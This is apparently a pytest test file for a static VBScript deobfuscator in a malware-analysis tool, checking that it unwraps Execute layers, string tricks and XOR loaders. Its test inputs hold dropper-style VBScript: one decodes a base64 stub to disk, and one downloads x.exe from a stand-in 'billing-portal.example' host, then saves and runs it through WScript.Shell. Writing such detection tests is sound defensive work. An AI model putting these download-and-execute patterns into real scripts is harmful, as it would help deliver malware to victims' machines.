"""Improve languages, phase 3 (VBScript): VBScript tokenised, parsed and walked here (never run):
Execute / ExecuteGlobal / Eval layers, functions with ByRef, arrays, loops, On Error Resume Next,
the COM objects droppers use (shared with the JScript evaluator), downloads and calls that depend
on the victim's machine.
"""

from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))
from test_js_techniques import _analyze, _ms, client  # noqa: E402,F401

from docutracex.resolve import vbs_eval  # noqa: E402

PE = b"MZ" + b"\x90\x00" * 30 + b" inert DocuTraceX stub " * 4


def _exec(code: str) -> list[str]:
    return [st.data for st in vbs_eval.resolve(code).stages if st.kind == "exec"]


@pytest.mark.parametrize(("code", "stage"), [
    ('x = Chr(87) & Chr(83) & "cript.Echo ""hi there"""\r\nExecute x', 'WScript.Echo "hi there"'),
    ('s = StrReverse("""esrever"" ohcE.tpircSW")\nExecuteGlobal s', 'WScript.Echo "reverse"'),
    ('s = Replace("WScQQript.EcQQho 1 + 2 + 3", "QQ", "")\nExecute s', "WScript.Echo 1 + 2 + 3"),
    ('a = Split("WScript|.Echo|  12345", "|")\nExecute Join(a, "")', "WScript.Echo  12345"),
    ('Dim a(2)\na(0) = "WScript" : a(1) = ".Echo " : a(2) = """arrays"""\nFor i = 0 To 2 : s = s & a(i) : Next\nExecute s',
     'WScript.Echo "arrays"'),
    ('Sub Run2(c)\n  Execute c\nEnd Sub\nSet r = GetRef("Run2")\nr "WScript.Echo ""getref"""', 'WScript.Echo "getref"'),
])
def test_execute_forms(code: str, stage: str) -> None:
    assert _exec(code)[:1] == [stage]


def test_function_loop_named_and_byref() -> None:
    code = ('Function Dec(arr, n)\n  Dim r, i\n  For i = 0 To UBound(arr)\n    r = r & ChrW(arr(i) - n)\n  Next\n'
            '  Dec = r\nEnd Function\nSub Twice(ByRef v)\n  v = v & v\nEnd Sub\n'
            'code = Dec(Array(%s), 3)\nx = "ab"\nTwice x\nIf x = "abab" Then Execute code\n'
            % ",".join(str(ord(c) + 3) for c in 'WScript.Echo "function decoded"'))
    s = vbs_eval.resolve(code)
    assert s.stages[0].data == 'WScript.Echo "function decoded"' and "sub(3)" in s.stages[0].recipe


def test_com_drop_download_and_unresolved() -> None:
    s = vbs_eval.resolve(
        'Set x = CreateObject("MSXML2.DOMDocument").createElement("b")\nx.DataType = "bin.base64"\n'
        f'x.Text = "{base64.b64encode(PE).decode()}"\nSet st = CreateObject("ADODB.Stream")\nWith st\n .Type = 1\n .Open\n'
        ' .Write x.NodeTypedValue\n .SaveToFile "C:\\Users\\Public\\f.exe", 2\nEnd With\n'
        'Set h = CreateObject("MSXML2.ServerXMLHTTP")\nh.Open "GET", "https://billing-portal.example/x.exe", False\nh.Send\n'
        'Set s2 = CreateObject("ADODB.Stream")\ns2.Type = 1 : s2.Open : s2.Write h.responseBody\n'
        's2.SaveToFile "C:\\Users\\Public\\x.exe", 2\nCreateObject("WScript.Shell").Run "C:\\Users\\Public\\x.exe"\n'
        'Execute CreateObject("WScript.Shell").RegRead("HKCU\\Software\\Fx\\n")\n')
    w = next(st for st in s.stages if st.kind == "write")
    assert w.data == PE and w.target == "C:\\Users\\Public\\f.exe"
    d = s.downloads[0]
    assert d["url"] == "https://billing-portal.example/x.exe" and d["saved_to"] == "C:\\Users\\Public\\x.exe"
    assert "runs it" in d["use"]
    assert s.unresolved and "HKCU\\Software\\Fx\\n" in s.unresolved[0]["depends_on"]


def test_on_error_select_and_quit_check() -> None:
    s = vbs_eval.resolve('On Error Resume Next\ny = 1 / 0\nIf Timer() < 3 Then WScript.Quit\n'
                         'Select Case 2\n  Case 1: x = 1\n  Case 2, 3: Execute "WScript.Echo ""after"""\nEnd Select\n')
    assert [st.data for st in s.stages] == ['WScript.Echo "after"']


def test_existing_xor_sample() -> None:
    s = vbs_eval.resolve(_ms().xor_loader_vbs().decode())
    assert s.stages[0].recipe[:2] == ("literal d", "xor(key k)")
    assert s.downloads and s.downloads[0]["url"].startswith("http://invoice-cdn.example/")


def test_vbs_loader_sample_end_to_end(client) -> None:  # noqa: ANN001,F811
    _cid, res = _analyze(client, "sample_vbs_loader.vbs", _ms().vbs_loader())
    vb = json.loads((res / "vbscript.json").read_text())
    r = vb["scripts"][0]["resolution"]
    first = r["stages"][0]
    assert first["kind"] == "exec" and first["recipe"][:3] == ["literal d", "reverse", "sub(7)"]
    assert ("write", 1, "pe") in {(s["kind"], s["depth"], s["type"]) for s in r["stages"]}
    urls = {d["url"] for d in r["downloads"]}
    assert {"https://billing-portal.example/inv/vbs-stage3.txt", "https://billing-portal.example/inv/vbs-config.json"} <= urls
    assert "Factura0187" in r["unresolved"][0]["depends_on"]
    rules = {f["rule"] for f in vb["findings"]}
    assert {"vbs_resolved_stages", "vbscript_resolved_download", "vbscript_unresolved_dynamic_call"} <= rules

    def walk(ns):  # noqa: ANN001, ANN202
        for n in ns:
            yield n
            yield from walk(n.get("children") or [])
    tree = json.loads((res / "nested.json").read_text())["tree"]
    layer2 = next(n for n in tree if n["filename"].endswith(".vbs"))
    assert layer2["recipe"][:3] == ["literal d", "reverse", "sub(7)"]
    assert any(n.get("format") == "PE" for n in walk(layer2.get("children") or []))
